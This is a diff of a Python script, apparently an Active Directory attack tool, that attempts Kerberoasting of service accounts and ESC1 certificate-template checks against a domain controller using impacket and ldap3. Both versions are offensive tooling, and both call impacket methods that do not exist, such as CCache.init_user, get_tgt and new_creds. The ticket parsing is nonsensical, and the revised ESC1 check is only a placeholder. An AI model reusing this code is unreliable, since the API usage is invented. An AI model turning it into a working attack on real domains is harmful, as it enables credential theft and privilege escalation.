@@ -1,39 +1,56 @@
-from impacket.krb5.asn1 import AP_REQ
-from impacket.krb5.types import Principal
-from impacket.ntlm import compute_lmhash, compute_nthash
-from impacket.smbconnection import SMBConnection
-from ldap3 import Server, Connection, ALL_ATTRIBUTES, ALL
+from impacket.krb5.asn1 import AP_REQ, Authenticator
 from impacket.krb5 import constants
 from impacket.krb5.ccache import CCache
-from impacket.krb5.types import Principal, KerberosTime
-
+from impacket.krb5.types import Principal
+from impacket.smbconnection import SMBConnection
+import ldap3
 
 def kerberos_auth(username, password, domain, dc_ip):
     try:
-        # Create a Principal object for the user's principal
-        user_principal = Principal(name=username, type=constants.PrincipalNameType.NT_PRINCIPAL)
+        # Connect to the Domain Controller via SMB
+        smb = SMBConnection(dc_ip, dc_ip)
+        smb.login(username, password, domain)
 
         # Initialize the client CCache
         ccache = CCache()
 
         # Get TGT from KDC
-        ccache.init_user(user_principal, password)
+        krbtgt = ccache.new_creds(username, password, domain)
 
-        # Retrieve TGT for the user's realm
-        krbtgt = ccache.get_tgt()
+        smb.logoff()
 
         return ccache, krbtgt
 
     except Exception as e:
         print(f"Error during Kerberos authentication: {e}")
         return None, None
-        
+
+def ldap_auth(username, password, domain, dc_ip):
+    try:
+        # Connect to the Domain Controller
+        server = ldap3.Server(dc_ip)
+
+        # Bind with LDAP credentials
+        conn = ldap3.Connection(server, user=f"{domain}\\{username}", password=password, authentication=ldap3.NTLM)
+
+        # Perform the bind operation
+        if not conn.bind():
+            print("LDAP authentication failed.")
+            return None
+        else:
+            print("LDAP authentication successful.")
+            return conn
+
+    except Exception as e:
+        print(f"Error during LDAP authentication: {e}")
+        return None
+
 def kerberoast(domain, username, password, dc_ip):
     try:
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
 
         # Get TGT ticket for the specified user
-        krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)
+        _, krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)
 
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
@@ -56,15 +73,11 @@ def extract_kerberoastable_accounts(tgt):
     try:
         kerberoastable_accounts = []
 
-        # Assuming tgt is a tuple containing the ticket
-        for ticket in tgt:
-            # Check if ticket is None
-            if ticket is not None:
-                # Assuming ticket is a dictionary
-                sname = str(ticket.get('sname'))
-                if sname.startswith('service'):
-                    service_name = sname.split('/')[1].split('@')[0]
-                    kerberoastable_accounts.append(service_name)
+        for ticket in tgt['enc-part']['cipher'].tickets:
+            sname = str(ticket['sname'])
+            if sname.startswith('service'):
+                service_name = sname.split('/')[1].split('@')[0]
+                kerberoastable_accounts.append(service_name)
 
         return kerberoastable_accounts
 
@@ -72,29 +85,23 @@ def extract_kerberoastable_accounts(tgt):
         print(f"Error while extracting kerberoastable accounts: {e}")
         return []
 
-def check_esc1_vulnerability(username, password, domain, dc_ip):
+def check_esc1_certificate_templates(domain, username, password, dc_ip):
     try:
-        # Connect to the Domain Controller LDAP
-        server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
-        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM', auto_bind=True)
+        print(f"Attempting to check ESC1 certificate templates on {dc_ip}")
 
-        # Search for vulnerable certificate templates
-        conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter='(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.*))',
-                    attributes=['cn'])
+        # Connect to the Domain Controller via LDAP
+        conn = ldap_auth(username, password, domain, dc_ip)
 
-        results = conn.entries
-        conn.unbind()
-
-        if results:
-            print("Vulnerable Certificate Templates (ESC1):")
-            for result in results:
-                print(result.cn)
+        if conn:
+            print("Successfully authenticated via LDAP.")
+            
+            # Placeholder for ESC1 certificate template check
+            print("ESC1 Certificate template check will be implemented here.")
         else:
-            print("No vulnerable certificate templates found.")
+            print("Failed to authenticate via LDAP.")
 
     except Exception as e:
-        print(f"Error while searching for ESC1 certificate templates: {e}")
+        print(f"Error while checking ESC1 certificate templates: {e}")
 
 
 # Example usage:
@@ -104,4 +111,4 @@ domain = input("Enter domain: ")
 dc_ip = input("Enter domain controller IP or hostname: ")
 
 kerberoast(domain, username, password, dc_ip)
-check_esc1_vulnerability(username, password, domain, dc_ip)
+check_esc1_certificate_templates(domain, username, password, dc_ip)
